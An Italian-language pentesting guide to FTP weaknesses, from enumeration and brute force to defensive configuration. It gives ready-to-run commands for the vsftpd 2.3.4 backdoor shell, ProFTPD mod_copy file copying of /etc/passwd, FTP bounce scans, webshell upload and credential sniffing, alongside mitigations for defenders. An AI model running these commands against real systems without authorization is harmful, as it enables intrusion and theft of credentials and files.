# FTP Vulnerabilities

## Scopo

Questa guida copre le vulnerabilità comuni nel protocollo FTP (File Transfer Protocol), incluse configurazioni insicure, autenticazione debole e tecniche di exploitation.

## Prerequisiti

- Kali Linux o distribuzione con tool di pentesting
- ftp, lftp, hydra
- **Autorizzazione scritta** per i test

## Installazione

```bash
sudo apt-get update
sudo apt-get install ftp lftp hydra
```

---

## Porte e Modalità

| Porta |           Uso           |
|-------|-------------------------|
| 21    | FTP Control (comandi)   |
| 20    | FTP Data (active mode)  |
| 1024+ | FTP Data (passive mode) |

### Modalità

- **Active Mode**: Server si connette al client (problemi con firewall)
- **Passive Mode**: Client si connette al server (più compatibile)

---

## Enumerazione

### Nmap

```bash
# Scansione FTP
nmap -p 21 -sV target

# Script FTP
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor target

# Tutti gli script FTP
nmap -p 21 --script "ftp-*" target
```

### Banner Grabbing

```bash
# Netcat
nc target 21

# Telnet
telnet target 21

# Nmap
nmap -p 21 -sV --script banner target
```

---

## Vulnerabilità Comuni

### Anonymous Login

```bash
# Test manuale
ftp target
Name: anonymous
Password: anonymous@

# Nmap script
nmap -p 21 --script ftp-anon target

# Automatico con lftp
lftp -u anonymous,anonymous@ target
```

### Credenziali Default

| Software  | Username  | Password |
|-----------|-----------|----------|
|   vsftpd  | anonymous | (blank)  |
|  ProFTPD  | anonymous | (blank)  |
| FileZilla |   admin   |   admin  |
| Pure-FTPd | anonymous | (blank)  |

### Brute Force

```bash
# Hydra
hydra -L users.txt -P passwords.txt ftp://target

# Con timeout
hydra -L users.txt -P passwords.txt -t 4 -w 30 ftp://target

# Medusa
medusa -h target -U users.txt -P passwords.txt -M ftp
```

---

## Exploit Noti

### vsftpd 2.3.4 Backdoor

```bash
# Nmap detection
nmap -p 21 --script ftp-vsftpd-backdoor target

# Metasploit
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS target
exploit

# Manuale (triggera backdoor con :) in username)
ftp target
Name: USER:)
# Backdoor apre shell su porta 6200
nc target 6200
```

### ProFTPD mod_copy (CVE-2015-3306)

```bash
# Copia file arbitrari
nc target 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

# Metasploit
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS target
set SITEPATH /var/www/html
exploit
```

### FTP Bounce Attack

```bash
# Scansione porte via FTP bounce
nmap -b anonymous:anonymous@ftp_server target

# Manuale
PORT target,port_high,port_low
LIST
```

---

## Post-Exploitation

### File Interessanti

```bash
# Download ricorsivo
wget -r ftp://anonymous:anonymous@target/

# Con lftp
lftp -u anonymous,anonymous target
mirror /

# File da cercare
- /etc/passwd
- /home/*/.ssh/
- config files
- backup files
- .htpasswd
```

### Upload Malware

```bash
# Se write access disponibile
ftp target
put webshell.php
# Accedi via web se in webroot
```

---

## Sniffing Credenziali

FTP trasmette credenziali in chiaro:

```bash
# Tcpdump
sudo tcpdump -i eth0 -A port 21

# Wireshark filter
ftp.request.command == "USER" || ftp.request.command == "PASS"
```

---

## Mitigazioni

### Disabilitare Anonymous

```bash
# vsftpd.conf
anonymous_enable=NO

# ProFTPD
<Anonymous ~ftp>
  User ftp
  Group nogroup
  UserAlias anonymous ftp
  RequireValidShell off
  MaxClients 0
</Anonymous>
```

### Usare FTPS/SFTP

```bash
# vsftpd con SSL
ssl_enable=YES
force_local_data_ssl=YES
force_local_logins_ssl=YES
ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO
rsa_cert_file=/etc/ssl/certs/vsftpd.pem
rsa_private_key_file=/etc/ssl/private/vsftpd.key
```

### Chroot Users

```bash
# vsftpd.conf
chroot_local_user=YES
allow_writeable_chroot=NO
```

### Limitare Accesso

```bash
# vsftpd - userlist
userlist_enable=YES
userlist_file=/etc/vsftpd.userlist
userlist_deny=NO
```

### Firewall

```bash
# Limita accesso per IP
iptables -A INPUT -p tcp --dport 21 -s trusted_ip -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j DROP
```

---

## Best Practices

- **Disabilita anonymous**: Se non strettamente necessario
- **Usa SFTP**: Preferisci SFTP (SSH) a FTP
- **Crittografia**: Se FTP necessario, usa FTPS
- **Chroot**: Isola utenti nelle loro directory
- **Password forti**: Implementa policy password
- **Logging**: Abilita logging dettagliato
- **Patch**: Mantieni software aggiornato
- **Monitoring**: Monitora accessi anomali

## Riferimenti

- [vsftpd Documentation](https://security.appspot.com/vsftpd.html)
- [ProFTPD Documentation](http://www.proftpd.org/docs/)
- [OWASP FTP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Testing_for_FTP)
- [FTP RFC 959](https://tools.ietf.org/html/rfc959)
